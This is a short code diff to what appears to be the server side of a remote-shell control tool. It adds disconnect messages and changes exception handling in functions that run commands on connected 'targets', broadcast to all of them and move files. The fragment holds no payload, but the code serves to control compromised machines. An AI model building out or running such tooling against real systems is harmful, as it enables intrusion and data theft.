@@ -204,6 +204,7 @@ def recv_msg(sock: socket.socket, command: str) -> None:
         logging.exception(f"{raddr} - Target disconnected mid command execution.")
         logging.info(f"{raddr} - Removing target from database.")
         CLIENTS.remove(client for client in CLIENTS if client[0] == sock)  # Remove current client from clients list
+        print(clr("[!] Disconnected from ") + str(raddr))
 
 
 def send_msg(sock: socket.socket, command: str) -> None:
@@ -252,6 +253,7 @@ def broadcast(command: str) -> None:
             logging.exception(f"{client[1]} - Unable to communicate with target.")
             logging.info(f"{client[1]} - Removing target from database.")
             CLIENTS.remove(client)
+            print(clr("[!] Disconnected from ") +str(client[1]))
 
     print(clr("[+] Finished executing on all available targets"))
     logging.info("Finished executing on all available targets.")
@@ -292,11 +294,12 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
                     download_file(sock, command[9:])
                 elif command[:7] == "upload ":  # Upload specified file from server side to client side
                     upload_file(sock, command[7:])
-    except ConnectionError as err:  # Socket connection error
+    except OSError as err:  # Socket connection error
         print(f"{clr('[!] ERROR: Current socket is no longer valid -')} {err}")
         logging.exception(f"{addr} - Unable to communicate with target.")
         logging.info(f"{addr} - Removing target from database.")
         CLIENTS.remove((sock, addr))
+        print(clr("[!] Disconnected from ") + str(addr))
     finally:
         # Close & remove sock from clients list if user exists with 'exit' / 'quit'
         # Do nothing if user exists with 'background' / 'bg'
@@ -304,6 +307,7 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
             sock.close()
             logging.info(f"{addr} - Removing target from database.")
             CLIENTS.remove((sock, addr))
+            print(clr("[!] Disconnected from ") + str(addr))
 
 
 def display_sessions() -> None:
